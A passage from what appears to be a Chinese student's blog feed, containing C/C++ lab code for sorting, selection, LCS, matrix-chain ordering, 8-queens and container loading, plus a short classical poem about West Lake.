        Merge(list,left,mid,right);           //合并左右两部分
    }
}
//快速排序的主调用函数
void MergeSort(List *list)
{
    MergeSort(list,0,list-&gt;n-1);
}

//最大堆结构体
typedef struct maxheap
{
    int n;
    Entry D[MaxSize];

} MaxHeap;
//向下调整
void AdjustDown(Entry heap[],int current,int border)
{
    int p = current;
    int maxChild;
    Entry temp;
    while(2*p+1&lt;=border)
    {
        if((2*p+2&lt;=border) &amp;&amp;(heap[2*p+1].key &lt; heap[2*p+2].key))
            maxChild = 2 * p + 2;
        else 
            maxChild = 2 * p + 1;
        if(heap[p].key&gt;=heap[maxChild].key)
            break;
        else  //否则将p和其最大孩子交换
        {
            temp = heap[p];
            heap[p] = heap[maxChild];
            heap[maxChild] = temp;
            p = maxChild;
        }
    }
}

void HeapSort(MaxHeap *hp)
{
    int i;
    Entry temp;
    for (i =( hp-&gt;n -2) / 2; i &gt;= 0;i--)
    {
        AdjustDown(hp-&gt;D,i,hp-&gt;n-1);
    }
        for (i = hp-&gt;n - 1; i &gt;= 0; i--)  //i指向当前堆的堆底元素
        {
            Swap(hp-&gt;D, 0, i);    //交换堆底与堆顶元素
            AdjustDown(hp-&gt;D, 0, i - 1);
        }
}

void Rand(List *list1)
{
    int i;
       srand((unsigned int)time(NULL));  //以运行程序时的时间作为随机数种子
    for (i = 0; i &lt;list1-&gt;n ; i++)
     {
        list1-&gt;D[i].key = rand();
    }
}



void Output(List *list)
{
    int i;
    for (i = 0; i &lt; list-&gt;n; i++)
    {
        printf("%4d ",list-&gt;D[i].key);
    }
}
void Output2(MaxHeap *heap)
{
    int i;
    for (i = 0; i &lt; heap-&gt;n; i++)
    {
        printf("%4d ",heap-&gt;D[i].key);
    }
}

MaxHeap heap;

int main()
{
    List list;
    // MaxHeap heap;
    static List temp=list;
    int i;
    clock_t start, finish;
    double duration;
    list.n = MaxSize;
    printf("numbers: %d \n",MaxSize);
    Rand(&amp;list);  //初始化
    // printf("Initial list:\n");
    // Output(&amp;list);           //输出


    temp = list;
    // printf("\n");
    start = clock();
    SelectSort(&amp;list);
    finish = clock();
    duration=(double)(finish - start) ; 
    // printf("\n\nSelectSort:\n");
    // printf( "%f ms\n", duration); //精度是1ms  //显示排序时间
    Output(&amp;list);
    


    list = temp;
    // printf("\n\nInitial list:\n");
    // Output(&amp;temp);
    // printf("\nInsertSort:\n");
    start = clock();
    InsertSort(&amp;list);
    finish = clock();
    duration=(double)(finish - start) / CLOCKS_PER_SEC; 
    // printf("\n\nInsertSort:\n");
    // printf( "%f ms\n", duration*1000 ); 
    Output(&amp;list);
   


    list = temp;
    // printf("\n\nInitial list:\n");
    // Output(&amp;temp);
    // printf("\nBubbleSort:\n");
    start = clock();
    BubbleSort(&amp;list);
    finish = clock();
    duration=(double)(finish - start) / CLOCKS_PER_SEC; 
    // printf("\n\nBubbleSort:\n");
    // printf( "%f ms\n", duration*1000 ); 
    Output(&amp;list);
   


    list = temp;
    // printf("\n\nInitial list:\n");
    // Output(&amp;temp);
    // printf("\nQuickSort:\n");
    start = clock();
    QuickSort(&amp;list);
    finish = clock();
    duration=(double)(finish - start) / CLOCKS_PER_SEC; 
    // printf("\n\nQuickSort:\n");
    // printf( "%f ms\n", duration*1000 ); 
    Output(&amp;list);


    list = temp;
    // printf("\n\nInitial list:\n");
    // Output(&amp;temp);
    // printf("\nMergeSort:\n");
    start = clock();
    MergeSort(&amp;list);
    finish = clock();
    duration=(double)(finish - start) / CLOCKS_PER_SEC; 
    // printf("\n\nMergeSort:\n");
    // printf( "%f ms\n", duration*1000 ); 
    Output(&amp;list);
 


    list = temp;
    heap.n = list.n;
    for (i = 0; i &lt; list.n;i++)
    {
        heap.D[i].key = list.D[i].key;
    }
        // printf("\n\nInitial list:\n");
    // Output(&amp;temp);
    // printf("\nHeapSort:\n");
    start = clock();
    HeapSort(&amp;heap);
    finish = clock();
    duration=(double)(finish - start) / CLOCKS_PER_SEC; 
    // printf("\n\nHeapSort:\n");
    // printf( "%f ms\n", duration*1000 ); 
    Output2(&amp;heap);

}

</code></pre>
<h4 id="时间统计与比较"><a href="#时间统计与比较" class="headerlink" title="时间统计与比较"></a>时间统计与比较</h4><p><img src="/2025/06/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86/clip_image002-1625712889034.png" alt="img"></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链表</tag>
        <tag>哈夫曼编码</tag>
        <tag>图</tag>
        <tag>内排序</tag>
      </tags>
  </entry>
  <entry>
    <title>诗和远方</title>
    <url>/2020/07/20/%E8%AF%97%E8%AF%8D/</url>
    <content><![CDATA[<p>迁客骚人，多会于此。我可能是后者​,​h​h​h<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f60f.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60f.png?v8">😏</span></p>
<span id="more"></span>



<h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-西湖"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-西湖" class="headerlink" title="&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 西湖"></a>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 西湖</h4><p><strong>&nbsp;六月西湖好，风光小处藏。</strong><br>&nbsp;（仄仄平平仄，平平仄仄平。）<br><strong>&nbsp;苏堤夹岸绿，曲院满池芳。</strong><br>&nbsp;（平平平仄仄，仄仄仄平平。）<br><strong>&nbsp;花港观鱼醉，扁舟水上忙。</strong><br>&nbsp;（平仄平平仄，平平仄仄平。）<br><strong>&nbsp;雷峰夕照晚，自适意悠长。</strong><br>&nbsp;（平平平仄仄，仄仄仄平平。）</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>文艺的心</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>诗词</tag>
      </tags>
  </entry>
  <entry>
    <title>【NJUPT】 算法实验（合集）</title>
    <url>/2021/07/06/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><p>1用分治法实现一组无序序列的两路合并排序和快速排序。 要求清楚合并排序及快速排 序的基本原理， 编程实现分别用这两种方法将输入的一组无序序列排序为有序序列后输出。 </p>
<p>2采用基于“五元中值组取中值分割法”（median-of-median-of-five partitioning） 的线性<br> 时间选择算法，找出 N 个元素集合 S 中的第 k 个最小的元素，使其在线性时间内解决。（参<br> 考教材 5.5.3 节）</p>
<p>​        <strong>分治法</strong>采用将一个难以直接求解的复杂问题分解成若干个规模较小、相互独立，但类型相同的子问题，直到子问题足够小，能够直接求解为止，然后求解这些子问题，并且将子问题的解合成原始问题的一个完整解的策略。基于这样一种策略，我们可以用它来解决一系列复杂的问题。对于排序问题，将原来的序列分成一个个子序列后分别进行排序，再将已排序的子序列合成一个有序序列是可行的，所以符合分治法策略。不过，合并排序和快速排序虽然都运用分治策略，但两者的角度不同，得到的排序算法也不相同。合并排序的问题分解过程十分简单，只需将序列一分为二即可：而快速排序的问题分解方法相对较困难，需调用Partition函数将一个序列划分为子序列。然而，从子问题解得到原问题解的过程对于快速排序来说异常简单，几乎无须额外的工作；但对于合并排序，则需要调用Merge函数来实现。所以，其实Partition函数和Merge函数是这两种排序算法的核心。而线性时间选择第k小元素这个算法我觉得也是受到了快速排序中的分划方法的启迪，采用分治法策略去求。</p>
<h3 id="1-合并排序与快速排序"><a href="#1-合并排序与快速排序" class="headerlink" title="1.合并排序与快速排序"></a>1.合并排序与快速排序</h3><pre><code class="line-numbers language-c++">#include&lt;iostream&gt;
#include&lt;fstream&gt;
#define INFTY 2147483647;
using namespace std;

class SortableList
{
    public:
        SortableList(int mSize)
        {
            maxSize = mSize;
            l = new int[maxSize];
            n = 0;
        }
        ~SortableList()
    {
    delete[] l;
    }
        void Input();
        void Output();
        void MergeSort();
        void QuickSort();
    private:
        int *l;
        int maxSize;
        int n;
        void Merge(int left,int mid,int right);
        void MergeSort(int left,int right);
        void QuickSort(int left, int right);
        void Swap(int i,int j);
        int Partition(int left, int right);
        
        
};

void SortableList::Merge(int left,int mid,int right)
{
    int *temp = new int[right - left + 1];
    int i = left, j = mid + 1, k = 0;
    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
        if(l[i]&lt;=l[j])
            temp[k++] = l[i++];
        else
            temp[k++] = l[j++];
    while(i&lt;=mid)                //将剩余元素输出
        temp[k++] = l[i++];
    while(j&lt;=right)
        temp[k++] = l[j++];
    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
        l[k++] = temp[i++];
}

void SortableList::MergeSort()
{
    MergeSort(0,n-1);
}
void SortableList::MergeSort(int left,int right)
{
    if(left&lt;right)
    {
        int mid = left + (right-left) / 2;
        MergeSort(left,mid);
        MergeSort(mid+1,right);
        Merge(left,mid,right);
    }
}

void SortableList::Swap(int i,int j)
{
    int temp = l[i];
    l[i] = l[j];
    l[j] = temp;
}

int SortableList::Partition(int left,int right)
{
    int i = left, j = right + 1;
    l[n]=INFTY;
    do{
        do
            i++;
        while (l[i]&lt;l[left]);
        do
            j--;
        while (l[j]&gt;l[left]);
        if(i&lt;j)
            Swap(i,j);
    } while (i &lt; j);
    Swap(left,j);
    return j;
}

void SortableList::QuickSort()
{
    QuickSort(0,n-1);
}
void SortableList::QuickSort(int left,int right)
{
    if(left&lt;right)
    {
        int j = Partition(left,right);
        QuickSort(left,j-1);
        QuickSort(j+1,right);
    }
}

// void SortableList::Input()
// {
//     for (int i = 0; i &lt; maxSize;i++)
//     {
//         cin &gt;&gt; l[i];
//         n++;
//     }
// }

void SortableList::Input()
{
    int i = 0;
    ifstream out ("Sort.txt");
    if(!out)
    {
        cout &lt;&lt; "Can not open output file.\n";
        return;
    }
    for (i = 0; i &lt; maxSize;i++)
    {
        out &gt;&gt; l[i];
        n++;
    }
    out.close();
   
}

void SortableList::Output()
{
    for (int i = 0; i &lt; maxSize;i++)
    {
        cout &lt;&lt; l[i] &lt;&lt; " ";
       // cout &lt;&lt; endl;
    }
}

int main()
{
    int key;
    int x, k;
    SortableList list(30);
    cout &lt;&lt; "原始序列：\n" &lt;&lt; endl;
    list.Input();
    list.Output();
    cout &lt;&lt; "\n\n请选择排序算法：【0】两路合并排序  【1】快速排序\n" &lt;&lt; endl;
    cin &gt;&gt; key;
    
    if(key==0)
    {
        list.MergeSort();
    }
    else
        list.QuickSort();
    cout &lt;&lt; "排序后的序列：\n\n";
    list.Output();
   
}
</code></pre>
<h3 id="2-选择第k小元素"><a href="#2-选择第k小元素" class="headerlink" title="2.选择第k小元素"></a>2.选择第k小元素</h3><p>​       求第k小元素其实可以直接通过排序算法将原序列排序好，然后取出第k小元素即可，但是这样的话在最坏情况下的时间复杂度就不是线性的了，比如采用快速排序，那么在最坏情况下时间复杂度为O(n^2)。人们并不满足与这样的时间复杂度，所以继续去优化这样的一个算法，采用二次取中法确定主元的方式使得分划所得的两个子集合的大小相对接近，从而避免了上述最坏情况的发生，使得最坏情况下的时间复杂度也是O(n),我想这就是算法设计与分析的魅力所在，通过应用或设计一种算法去不断优化时空复杂度。</p>
<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
#include &lt;fstream&gt;
#define INFTY 2147483647;
using namespace std;

class SortableList
{
    public:
        SortableList(int mSize)
        {
            maxSize = mSize;
            l = new int[maxSize];
            n = 0;
        }
        ~SortableList()
    {
    delete[] l;
    }
        void Input();
        void Output();
        void MergeSort();
        int Select(int&amp; x,int k);
        int Ceil(int a,int b);

    private:
        int *l;
        int maxSize;
        int n;
        void Merge(int left,int mid,int right);
        void MergeSort(int left,int right);
        void Swap(int i,int j);
        int Partition(int left, int right);
        int Select(int k,int left,int right,int r);
        
};

void SortableList::Merge(int left,int mid,int right)
{
    int *temp = new int[right - left + 1];
    int i = left, j = mid + 1, k = 0;
    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
        if(l[i]&lt;=l[j])
            temp[k++] = l[i++];
        else
            temp[k++] = l[j++];
    while(i&lt;=mid)                //将剩余元素输出
        temp[k++] = l[i++];
    while(j&lt;=right)
        temp[k++] = l[j++];
    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
        l[k++] = temp[i++];
}

void SortableList::MergeSort()
{
    MergeSort(0,n-1);
}
void SortableList::MergeSort(int left,int right)
{
    if(left&lt;right)
    {
        int mid = left + (right-left) / 2;
        MergeSort(left,mid);
        MergeSort(mid+1,right);
        Merge(left,mid,right);
    }
}

void SortableList::Swap(int i,int j)
{
    int temp = l[i];
    l[i] = l[j];
    l[j] = temp;
}

int SortableList::Partition(int left,int right)
{
    int i = left, j = right + 1;
    l[n]=INFTY;
    do{
        do
            i++;
        while (l[i]&lt;l[left]);
        do
            j--;
        while (l[j]&gt;l[left]);
        if(i&lt;j)
            Swap(i,j);
    } while (i &lt; j);
    Swap(left,j);
    return j;
}


void SortableList::Input()
{
    int i = 0;
    ifstream out ("Sort.txt");
    if(!out)
    {
        cout &lt;&lt; "Can not open output file.\n";
        return;
    }
    for (i = 0; i &lt; maxSize;i++)
    {
        out &gt;&gt; l[i];
        n++;
    }
    out.close();
   
}

void SortableList::Output()
{
    for (int i = 0; i &lt; maxSize;i++)
    {
        cout &lt;&lt; l[i] &lt;&lt; " ";
       // cout &lt;&lt; endl;
    }
}

int SortableList::Ceil(int a,int b)
{
    return (int)(a / b) + 1;
}

int SortableList::Select(int&amp;x,int k)
{
    if(n&lt;=0||k&gt;n||k&lt;=0)
        return -1;
    int j = Select(k,0,n-1,5);
    x = l[j];
        return 1;
}

int SortableList::Select(int k,int left,int right,int r)
{
    int n = right - left + 1;
    if(n&lt;=r)
    {
        MergeSort(left,right);
        return left + k - 1;
    }
    for (int i = 1; i &lt; n / r;i++)
    {
        MergeSort(left+(i-1)*r,left+i*r-1);
        Swap(left+i-1,left+(i-1)*r+Ceil(r,2)-1);

    }
    int j = Select(Ceil(n/r,2),left,left+(n/2)-1,r);
    Swap(left,j);
    j = Partition(left,right);
    if(k==j-left+1)
        return j;
    else if(k&lt;j-left+1)
        return Select(k,left,j-1,r);
        else
            return Select(k-(j-left+1),j+1,right,r);

}

int main()
{
    int key;
    int x, k;
    SortableList list(30);
    list.Input();
    list.Output();
    cout &lt;&lt; "\n\n请输入要寻找的第几小元素：\n";
    cin &gt;&gt; k;
    list.Select(x,k);
    cout &lt;&lt; x &lt;&lt; endl;
    //list.Output();
}
</code></pre>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><ul>
<li>用动态规划法和备忘录方法实现求两序列的 最长公共子序列问题。 要求掌握动态规划法思想在实际中的应用，分析最长公共子序列的问题特征，选择算法策略并设计具体算法，编程实现两输入序列的比较，并输出它们的最长公共子序列。</li>
<li>用动态规划法和备忘录方法求解矩阵相乘问题， 求得最优的计算次序以使得矩阵连乘总的数乘次数最少，并输出加括号的最优乘法算式。</li>
</ul>
<h3 id="1-最长公共子序列"><a href="#1-最长公共子序列" class="headerlink" title="1.最长公共子序列"></a>1.最长公共子序列</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
using namespace std;
int const MaxLen = 50;
class LCS
{
    public:
        LCS(int nx,int ny,char *a,char *b);
        ~LCS();
        int LCSLength();
        void CLCS();
        void Output(int **a);
        int** getc()  // 用来访问私有数据成员
        {
            return c;
        };
         int** gets()
        {
            return s;
        };

    private:
        void CLCS(int i,int j);
        int **c, **s;
        int m, n;
        char *x, *y;
};

LCS::LCS(int nx,int ny,char *a,char *b)
{
    m = nx;
    n = ny;
    x = a;
    y = b;
    c = new int *[m + 1];
    s = new int *[m + 1];
    for (int i = 0; i &lt;= m;i++)
    {
        c[i] = new int[n + 1];
        s[i] = new int[n + 1];
    }
}

LCS::~LCS()
{
    for (int i = 0; i &lt; m;i++)
    {
        delete c[i];
        delete s[i];
    }
    delete c;
    delete s;
}

int LCS::LCSLength()
{
    int i,j;
    for ( i = 0; i &lt;= m;i++)
        {
            c[i][0] = 0;
            s[i][0] = 0;
        }
    for (j = 1; j &lt;= n;j++)
        {
            c[0][j] = 0;
            s[0][j] = 0;
        }
    for (i = 1; i &lt;= m;i++)
        {
            for (j = 1; j &lt;= n;j++)
            {
                // if(x[i]==y[i])   !!!!! 应该是y[j]
                // {
                //     c[i][j] = c[i-1][j-1]+ 1;   // 左上格值 + 1
                //     s[i][j] = 1;
                // }
                if(x[i] == y[j])  //由c[i-1][j-1]得到c[i][j]
                {
                    c[i][j] = c[i - 1][j - 1] + 1;
                    s[i][j] = 1;
                }
                else if(c[i-1][j] &gt;= c[i][j-1])    // 左格值 &gt; 上格值
                {
                    c[i][j] = c[i - 1][j];
                    s[i][j] = 2;
                }
                else     //左格值 &lt; 上格值
                {
                    c[i][j] = c[i][j - 1];
                    s[i][j] = 3;
                }
            }
        }    
return c[m][n];      // 返回最优解值
}

void LCS::CLCS(int i,int j)
{
    if(i==0||j==0)
        return;
    if(s[i][j]==1)
    {
        CLCS(i-1,j-1);
        cout &lt;&lt; x[i];
    }else if(s[i][j]==2)
        CLCS(i-1,j);
    else
        CLCS(i, j - 1);
}
void LCS::CLCS()
{
    CLCS(m,n);
}

void LCS::Output(int **a)
{
    
    int i, j;
    printf("  ");
    for (i = 0; i &lt;= n;i++)
    {
        printf("%4d",i);
    }
    printf("\n");
    for (i = 0; i &lt;= m;i++)
    {
        printf("%2d",i);
        for (j = 0; j &lt;= n;j++)
           {
               printf("%4d",a[i][j]);
           }
           printf("\n");
    }
   
}

int main()
{
    // int nx = 7, ny = 6;
    // char *x = (char*)"0abcbdab";
    // char *y = (char*)"0bdcaba";
    
    int nx, ny;
    char *x = new char[MaxLen], *y = new char[MaxLen];
    cout &lt;&lt; "Please input X:(Start with 0, like 0ab)" &lt;&lt; endl;
    scanf("%s", x);
    nx = strlen(x)-1;
    cout &lt;&lt;endl&lt;&lt; "Please input Y:(Start with 0, like 0ab)" &lt;&lt; endl;
    scanf("%s", y);
    ny = strlen(y)-1;
    LCS lcs(nx, ny, x, y);
    cout &lt;&lt;endl&lt;&lt; "The LCSLength of X and Y is: " &lt;&lt; lcs.LCSLength() &lt;&lt; endl&lt;&lt;endl;
    cout &lt;&lt; "The CLCS is: " ;
    lcs.CLCS();
    cout &lt;&lt; endl;
    
    cout &lt;&lt;endl&lt;&lt; "  c  =  " &lt;&lt; endl&lt;&lt;endl;
    lcs.Output(lcs.getc());    // 输出c[i][j]
    cout &lt;&lt;endl&lt;&lt;endl&lt;&lt; "  s  =  " &lt;&lt; endl&lt;&lt;endl;
    lcs.Output(lcs.gets());   // 输出s[i][j]
    delete []x;
    delete []y;
    return 0;
}
</code></pre>
<h3 id="2-矩阵连乘"><a href="#2-矩阵连乘" class="headerlink" title="2.矩阵连乘"></a>2.矩阵连乘</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
#include &lt;iomanip&gt;  //输出格式头文件
using namespace std;
int const MaxLen = 50;
class MatrixChain
{
    public:
        MatrixChain(int mSize,int *q);
        int MChain();
        int LookupChain();
        void Traceback();
        void Output();

    private:
        void Traceback(int i,int j);
        int LookupChain(int i,int j);
        int *p, **m, **s, n;
};

MatrixChain::MatrixChain(int mSize, int *q)
{  n=mSize;
   m=new int*[n];   s=new int*[n];   p=new int[n+1];
   for(int i=0; i&lt;n; i++)
   {  m[i]=new int [n];   m[i][i]=0;
      s[i]=new int [n];   s[i][i]=0;
         p[i]=q[i];
   }
   p[n]=q[n];
}

int MatrixChain::MChain()
{  //求A[0:n-1]的最优解值
   //for (int i=0;i&lt;n; i++) m[i][i]=0;  //由于构造函数中有了m[i][i]=0的语句，这条可以删除，且备忘录方法输出的s数组对角线就是0，否则不正确。
   for (int r=2; r&lt;=n; r++)
     for (int i=0; i&lt;=n-r; i++) 
                    {   int j=i+r-1;
           m[i][j]=m[i+1][j]+p[i]*p[i+1]*p[j+1];  //m[i][j] 的初值
            s[i][j]=i;
            for (int k=i+1;    k&lt;j; k++) 
                                {  int t=m[i][k]+m[k+1][j]+p[i]*p[k+1]*p[j+1];
                 if (t&lt;m[i][j]) 
                                            {  m[i][j]=t;   s[i][j]=k;
                                            }
                                }
                    }
      return m[0][n-1];
}

void MatrixChain::Traceback(int i,int j)
{
    if(i==j)
    {
        cout &lt;&lt; 'A' &lt;&lt; i;
        return;
    }
    if(i&lt;s[i][j])
        cout &lt;&lt; '(';
    Traceback(i,s[i][j]);
    if(i&lt;s[i][j])
        cout &lt;&lt; ')';
    if(s[i][j]+1&lt;j)
        cout &lt;&lt; '(';
    Traceback(s[i][j]+1,j);
    if(s[i][j]+1&lt;j)
        cout &lt;&lt; ')';

}

void MatrixChain::Traceback()
{
    cout &lt;&lt; '(';
    Traceback(0,n-1);
    cout &lt;&lt; ')';
    cout &lt;&lt; endl;
}

int MatrixChain::LookupChain(int i, int j)
{   if (m[i][j]&gt;0) return m[i][j];                  //子问题已经求解，直接引用
      if(i==j) return 0;                                      //单一矩阵无须计算
      int u=LookupChain(i+1, j)+p[i]*p[i+1]*p[j+1]; //按式（7-9）求最小值
    s[i][j]=i;
    for (int k=i+1; k&lt;j; k++) 
            {  int t=LookupChain(i, k)+LookupChain(k+1, j)+p[i]*p[k+1]*p[j+1];
         if (t&lt;u) 
                        {  u=t;   s[i][j]=k;
                        }
            }
    m[i][j]=u; return u;                           //保存并返回子最优解值
}

int MatrixChain::LookupChain()
{  
    return LookupChain(0, n-1);     //返回A[0:n-1]的最优解值
}

void MatrixChain::Output()
{  int i,j;
  
   cout&lt;&lt;"  m="&lt;&lt;endl;
   cout&lt;&lt;"  ";
   for(j=0; j&lt;n; j++)
                  if(j&lt;2) cout&lt;&lt;setw(4)&lt;&lt;j;
                        else cout&lt;&lt;setw(6)&lt;&lt;j;
   cout&lt;&lt;endl;

   for(i=0; i&lt;n; i++)
   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
      for(j=0; j&lt;n; j++)
                        {  if(i&lt;j) cout&lt;&lt;setw(6)&lt;&lt;m[i][j];  //setw(6), 指定输出域宽为6
         else if(i==j) cout&lt;&lt;setw(2)&lt;&lt;m[i][j];
            else cout&lt;&lt;setw(6)&lt;&lt;" ";
                        }
         cout&lt;&lt;endl;
   }

   cout&lt;&lt;"  s="&lt;&lt;endl;
   cout&lt;&lt;"    ";
   for(j=0; j&lt;n; j++) cout&lt;&lt;j&lt;&lt;" ";
   cout&lt;&lt;endl;
   for(i=0; i&lt;n; i++)
   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
      for(j=0; j&lt;n; j++)
      {  if(i&lt;=j) cout&lt;&lt;s[i][j]&lt;&lt;" ";
         else cout&lt;&lt;"  ";
      }
      cout&lt;&lt;endl;
   }
}

int main()
{ 
//   int nn=6,k,k2;
//   int pp[7]={30,35,15,5,10,20,25};
int pp[MaxLen];
int nn,i,k, k2;
cout &lt;&lt; "  请输入连乘矩阵的个数" &lt;&lt; endl;
scanf("%d", &amp;nn);
cout &lt;&lt; "  请输入连乘矩阵的"&lt;&lt;nn+1&lt;&lt;"个维数(以空格隔开)"&lt;&lt; endl;
for (i = 1; i &lt;= nn+1;i++)
    {
        scanf("%d", &amp;pp[i-1]);
    }
MatrixChain mm(nn, pp);
k = mm.MChain();
cout &lt;&lt; "  最少数乘次数k=" &lt;&lt; k &lt;&lt; endl; //最少数乘次数k=15125
mm.Traceback();                          //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
cout &lt;&lt; endl;
mm.Output();
k2 = mm.LookupChain();
cout &lt;&lt;endl&lt;&lt; "采用备忘录方法：" &lt;&lt; endl;
cout &lt;&lt; "  最少数乘次数k2=" &lt;&lt; k2 &lt;&lt; endl; //最少数乘次数k=15125
mm.Traceback();                            //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
cout &lt;&lt; endl;
mm.Output();

  
}
</code></pre>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><ul>
<li><p>用回溯法求解 8- 皇后问题，使放置在 8*8 棋盘上的 8 个皇后彼此不受攻击，即：任何两个皇后都不在同一行、同一列或同一斜线上。请输出 8-皇后问题的所有可行解。</p>
</li>
<li><p>用回溯法编写一个递归程序解决如下装载问题： 有 n 个集装箱要装上 2 艘载重分别为 c1和 c2的轮船，其中集装箱 i 的重量为 wi（1≤ i ≤ n） ，且                                ,问是否有一个合理的装载方案可以将这 n 个集装箱装上这 2 艘轮船？如果有，请给出装载方案</p>
<p>提示 ：参考 子集和数问题的求解方法。 </p>
<p>举例 ： 当 n=3， c1=c2=50， 且 w=[10,40,40]时， 可以将集装箱 1 和 2 装到第一艘轮船上，集装箱 3 装到第二艘轮船上；如果 w=[20,40,40]时，无法将这 3 个集装箱都装上轮船。</p>
</li>
</ul>
<h3 id="1-8皇后问题"><a href="#1-8皇后问题" class="headerlink" title="1.8皇后问题"></a>1.8皇后问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;cmath&gt;
#define N 8        // 8 皇后
using namespace std;
int count = 0,count2=0;

//判定两个皇后是否在同一列或在同一斜线上
bool Place(int k, int i, int *x)
{
   for(int j = 0; j &lt; k; j++)
   if((x[j] == i) || (abs(x[j] - i) == abs(j - k))) 
       return false;
   return true;
}

//递归函数（求解n皇后问题）
void NQueens(int k, int n, int *x) 
{
    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
    {
        if(Place(k, i, x))  //约束函数
        {
            x[k] = i;
            if(k == n - 1)    
            {
                for(i = 0; i &lt; n; i++) 
                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
                cout &lt;&lt; endl;
                count ++;
            }
            else
            {
               NQueens(k + 1, n, x);  //深度优先进入下一层
            }
       }
    }
}

void NQueens(int n, int *x)
{
    NQueens(0, n, x);
}

//求非对称解
void NQueens2(int k, int n, int *x) 
{
    static int temp=n;        //求非对称的解
    if(k==0)
        n = int(temp / 2);
    else
        n = temp;
    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
    {
        if(Place(k, i, x))  //约束函数
        {
            x[k] = i;
            if(k == n - 1)    
            {
                for(i = 0; i &lt; n; i++) 
                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
                cout &lt;&lt; endl;
                count2 ++;
            }
            else
            {
               NQueens2(k + 1, n, x);  //深度优先进入下一层
            }
       }
    }
}

void NQueens2(int n, int *x)
{
    NQueens2(0, n, x);
}

int main()
{
    int queens[N];  //8皇后
    // int count = 0,count2=0;
    for(int i = 0; i &lt; N; i++) 
        queens[i] = -1;
    NQueens(N, queens);
    cout &lt;&lt;endl&lt;&lt; "可行解共有: " &lt;&lt; count &lt;&lt;" 组"&lt;&lt; endl;
    cout &lt;&lt; endl&lt;&lt; " 仅输出非对称解 : " &lt;&lt; endl;
    NQueens2(N, queens);
    cout &lt;&lt;endl&lt;&lt; "非对称可行解共有: " &lt;&lt; count2 &lt;&lt;" 组"&lt;&lt; endl;
    getchar();
    return 0;
}
</code></pre>
<h3 id="2-装载问题"><a href="#2-装载问题" class="headerlink" title="2.装载问题"></a>2.装载问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;

using namespace std;

template &lt;class T&gt; 
class Loading  
{ 
private: 
  int  n,  // 集装箱数 
   x[100],   // 当前解 
   bestx[100]; // 当前 第一艘 船的最优解 
T  c1, // 第一艘轮船的核定载重量 
   c2, // 第二艘轮船的核定载重量 
   w[100], // 集装箱重量数组 
   total,  // 所有集装箱重量之和 
   cw,   // 当前 第一艘船的 载重量 
   bestw, // 当前 第一艘 船的最优载重量 
   r;   // 剩余集装箱总重量 
public: 
  Loading()   // 构造函数 
  {
    cout&lt;&lt;"请输入集装箱的数量："&lt;&lt;endl;
    cin&gt;&gt;n;
    cout&lt;&lt;"请输入轮船1、2的载重量："&lt;&lt;endl;
    cin&gt;&gt;c1&gt;&gt;c2;
    cout&lt;&lt;"请输入每个集装箱的重量："&lt;&lt;endl;
    for(int i=1;i&lt;=n;i++)
    {
        cin&gt;&gt;w[i];
    }

    r=0;
    cw=0;
    bestw=0;
    for(int i=1;i&lt;=n;i++)
    {
        r=r+w[i];
    }
  }

      ~Loading() // 析构函数
      {
      }
    void Backtrack(int i); // 找到最接近第一艘轮船载重c1 的最佳装载方案，
                                // 最优载重值bestw ，最优解数组bestx 。
    void Show();          // 输出整个装载方案 
}; 
 
template &lt;class T&gt; 
void Loading&lt;T&gt;::Backtrack(int i) 
{  
 if(i&gt;n) //判断是否达到叶子节点
    { //到达叶子节点
        if(cw&gt;bestw)
        {
